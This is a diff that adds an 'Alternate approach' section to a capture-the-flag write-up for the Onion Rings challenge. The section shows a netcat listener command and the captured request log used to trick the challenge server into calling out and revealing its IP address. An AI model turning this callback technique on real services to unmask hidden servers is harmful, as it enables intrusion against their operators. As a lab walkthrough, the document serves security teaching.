@@ -158,6 +158,31 @@ Looking at `/var/www/blog/index.php` it’s obvious that the blog is powered by 
 
 Most of the files in `/var/www/onion_rings` could be retrieved; others couldn’t because they were too large. [They’re in the `source` folder](source) if you’re curious, but note that these files were not helpful at all for getting the flag.
 
+## Alternate approach
+
+Another approach would be to enter a URL on a server under your control.
+
+Start [Netcat](http://netcat.sourceforge.net/) or [Ncat](http://nmap.org/ncat) on your host to listen on port 80 (attention: your host should _not_ be behind NAT):
+
+```bash
+$ nc -vlp 80 # or use `netcat`
+```
+
+Then, on the Onion Rings website, enter the URL e.g. `http://your-host.example.com/1.jpg` and look for the IP of the Onion Rings server.
+
+```
+Ncat: Version 6.25 ( http://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 212.83.153.197.
+Ncat: Connection from 212.83.153.197:54869.
+GET /1.jpg HTTP/1.1
+Host: your-host.example.com
+Accept: */*
+```
+
+The IP address is clearly `212.83.153.197`. Visiting `http://212.83.153.197/` shows [the blog we’ve discussed before](blog.html), which contains the flag.
+
 ## Other write-ups
 
 * <http://csrc.tamuc.edu/css/?p=116>
